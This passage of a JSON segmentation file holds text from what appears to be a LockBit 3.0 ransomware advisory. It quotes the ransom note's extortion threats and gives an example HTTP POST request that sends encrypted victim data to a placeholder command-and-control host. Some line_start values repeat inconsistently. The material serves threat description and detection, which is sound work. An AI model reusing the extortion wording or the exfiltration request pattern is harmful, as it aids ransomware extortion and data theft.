    "u007": {
      "start": 46,
      "end": 69,
      "text": "LockBit 3.0 Ransom Note",
      "line_start": 46
    },
    "u008": {
      "start": 70,
      "end": 145,
      "text": "~~~ LockBit 3.0 the world's fastest and most stable ransomware from 2019~~~",
      "line_start": 70
    },
    "u009": {
      "start": 146,
      "end": 186,
      "text": ">>>>> Your data is stolen and encrypted.",
      "line_start": 146
    },
    "u010": {
      "start": 187,
      "end": 268,
      "text": "If you don't pay the ransom, the data will be published on our TOR darknet sites.",
      "line_start": 187
    },
    "u011": {
      "start": 269,
      "end": 416,
      "text": "Keep in mind that once your data appears on our leak site, it could be bought by your competitors at any second, so don't hesitate for a long time.",
      "line_start": 187
    },
    "u012": {
      "start": 417,
      "end": 485,
      "text": "The sooner you pay the ransom, the sooner your company will be safe.",
      "line_start": 187
    },
    "u013": {
      "start": 486,
      "end": 505,
      "text": "Network Connections",
      "line_start": 486
    },
    "u014": {
      "start": 506,
      "end": 590,
      "text": "If configured, Lockbit 3.0 will send two HTTP POST requests to one of the C2servers.",
      "line_start": 506
    },
    "u015": {
      "start": 591,
      "end": 716,
      "text": "Information about the victim host and bot are encrypted with an Advanced Encryption Standard (AES) key and encoded in Base64.",
      "line_start": 506
    },
    "u016": {
      "start": 717,
      "end": 745,
      "text": "Example of HTTP POST request",
      "line_start": 717
    },
    "u017": {
      "start": 746,
      "end": 846,
      "text": "POST <Lockbit C2>/?7F6Da=u5a0TdP0&Aojq=&NtN1W=OuoaovMvrVJSmPNaA5&fckp9=FCYyT6b7kdyeEXywS8I8 HTTP/1.1",
      "line_start": 746
    },
    "u018": {
      "start": 847,
      "end": 858,
      "text": "Accept: */*",
      "line_start": 847
    },
    "u019": {
      "start": 859,
      "end": 918,
      "text": "Accept-Encoding: gzip, deflate, br Content-Type: text/plain",
      "line_start": 859
    },
